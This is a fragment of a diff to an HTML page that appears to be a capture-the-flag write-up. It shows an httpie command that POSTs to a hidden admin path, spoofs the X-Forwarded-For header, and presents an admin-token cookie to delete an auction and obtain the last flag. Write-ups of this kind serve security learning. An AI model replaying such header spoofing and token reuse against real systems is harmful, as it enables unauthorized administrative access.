+<span id="cb22-4"><a href="#cb22-4"></a>  auction_hash=8ylbbgs2</span></code></pre></div>
 <p>Delete it with <code>action=delete</code></p>
-<pre><code>http -v --form POST http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/ \
-  X-Forwarded-For:8.8.8.8 \
-  Cookie:admin-token=DF120B994C5FD4377A42F55D086F6EF7 \
-  auction_hash=8ylbbgs2 \
-  action=delete</code></pre>
+<div class="sourceCode" id="cb23"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1"></a><span class="ex">http</span> -v --form POST http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/ \</span>
+<span id="cb23-2"><a href="#cb23-2"></a>  X-Forwarded-For:8.8.8.8 \</span>
+<span id="cb23-3"><a href="#cb23-3"></a>  Cookie:admin-token=DF120B994C5FD4377A42F55D086F6EF7 \</span>
+<span id="cb23-4"><a href="#cb23-4"></a>  auction_hash=8ylbbgs2 \</span>
+<span id="cb23-5"><a href="#cb23-5"></a>  action=delete</span></code></pre></div>
 <p>The last flag is in response.</p>
     </div>
     <a id="back-to-top" class="back-to-top" href="#header">TOP</a>
